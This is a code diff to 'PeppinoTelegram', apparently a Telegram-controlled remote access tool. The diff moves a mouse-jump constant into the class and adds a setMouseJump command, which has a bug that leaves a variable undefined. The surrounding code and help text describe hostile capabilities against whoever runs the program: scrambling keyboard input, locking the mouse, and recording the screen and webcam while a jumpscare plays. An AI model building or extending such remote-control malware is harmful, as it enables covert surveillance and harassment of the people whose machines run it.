@@ -89,7 +89,7 @@ islinux = not iswindows
 cwd_folder = getcwd()
 HOME_PATH = getenv("USERPROFILE") if iswindows else getenv("HOME")
 BURN_DIRECTORY = gettempdir()
-MOUSE_JMP = 50
+TELEGRAM_BOT_LIMIT = 30 * 1024 * 1024  # 50 MB(I put 30MB just because 50 crashed a lot)
 
 all_spinners = {
     "slash": ["|", "/", "-", "\\"],
@@ -319,6 +319,7 @@ randomkeyboard - Sets all user's input to random characters.
 capslock - Activates capslock.
 mousecontroller - Sends a mouse controlling menu.
 mouselock - Locks the mouse in position.
+setMouseJump - Sets the jump of the mouse in mousecontroller.
 
 📋 Messaging
 bsend - Send custom text.
@@ -364,7 +365,6 @@ For example this command: "/fullclip 10; /jumpscare" will start the recording, w
 jumpscare while recording screen and webcam
 """
 
-TELEGRAM_BOT_LIMIT = 30 * 1024 * 1024  # 50 MB(I put 30MB just because 50 crashed a lot)
 
 def now() -> str:
     return datetime.now().strftime("%Y-%m-%d %H:%M:%S")
@@ -842,6 +842,8 @@ class PeppinoTelegram:
             "last_response":None       #can be None, or the last response of an input
         }
 
+        self.MOUSE_JMP = 50
+
         self.webcam_url = None
         self.screen_url = None
         self.webcam_and_screen_url = None
@@ -950,6 +952,7 @@ class PeppinoTelegram:
             "mousel":self.mousel,
             "mouseu":self.mouseu,
             "moused":self.moused,
+            "setMouseJump":self.setMouseJump,
             "mainmenu":self.mainmenu,
             "menu_system":self.menu_system,
             "menu_network":self.menu_network,
@@ -1440,21 +1443,32 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
         }
         self.mouse_controller_menu = self.new_menu(menu, label=f"{emoji_dict['mouse']} Mouse Control", rows=3, close_btn_lab="MOUSE_closemenu")
 
+    def setMouseJump(self, jump: int= None) -> None:
+        if jump is None:
+            jmp = self.send_prompt("Set mouse jump: ")
+        if jmp.isnumeric():
+            jmp = int(jmp)
+            if jmp < 1:
+                self.bsend("Mouse jump mouse be above 0.")
+            self.MOUSE_JMP = jmp
+        else:
+            self.bsend("Mouse jump must be numeric.")
+
     def moused(self) -> None:
         pos = pg.position()
-        pg.moveTo(pos[0], pos[1]+MOUSE_JMP)
+        pg.moveTo(pos[0], pos[1]+self.MOUSE_JMP)
 
     def mousel(self) -> None:
         pos = pg.position()
-        pg.moveTo(pos[0]-MOUSE_JMP, pos[1])
+        pg.moveTo(pos[0]-self.MOUSE_JMP, pos[1])
 
     def mouser(self) -> None:
         pos = pg.position()
-        pg.moveTo(pos[0]+MOUSE_JMP, pos[1])
+        pg.moveTo(pos[0]+self.MOUSE_JMP, pos[1])
 
     def mouseu(self) -> None:
         pos = pg.position()
-        pg.moveTo(pos[0], pos[1]-MOUSE_JMP)
+        pg.moveTo(pos[0], pos[1]-self.MOUSE_JMP)
 
     def mouselock(self, timer: int=6) -> None:
         bar = self.new_loading_bar(timer, label=f"{emoji_dict['mouse']} Mouselock")
